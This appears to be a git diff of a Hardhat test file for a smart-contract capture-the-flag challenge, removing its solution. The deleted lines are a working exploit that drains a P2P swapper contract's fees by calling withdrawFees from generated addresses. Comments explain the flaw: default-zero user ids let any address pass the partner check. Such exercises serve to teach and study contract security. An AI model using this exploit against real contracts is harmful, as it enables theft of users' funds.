@@ -37,31 +37,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  // the default value for any address in the userByAddress mapping is 0 (e.g. user id)
-  // thus if a user has not called signup(..), then their id will default to 0
-  await weth.connect(attacker).deposit({value:precision.mul(1)})
-  await weth.connect(attacker).approve(p2pSwapper.address,precision.mul(1))
-  await p2pSwapper.connect(attacker).createDeal(weth.address,1_000_000,weth.address,1_000_000,{value:2_000_000})
-  console.log(await weth.balanceOf(p2pSwapper.address))
-
-  // remember that all new addresses will have their id default to 0
-  let numLoops = (await weth.balanceOf(p2pSwapper.address)) / (await p2pSwapper.partnerFees(0))
-
-  let genAddress
-  for (let i=1; i<numLoops+1; i++) {
-    // this works as long as numLoops < 256
-    genAddress = "0x"+"0".repeat(38)+ethers.utils.hexlify(i).substring(2)
-    await p2pSwapper.connect(attacker).withdrawFees(genAddress)
-  }
-
-  // in withdrawFees(..) there is the statement: require(partnerById[userId] == userByAddress[msg.sender])
-  // it is checking whether you are the address who referred the user whom you want to withdraw fees for
-  // without calling signup(..), userByAddress[..] will default to 0
-  // additionally, partnerById[..] will also default to 0
-  // this results in arbitrary addresses passing this check
-
-  console.log(await weth.balanceOf(p2pSwapper.address))
-
 });
 
 after(async () => {
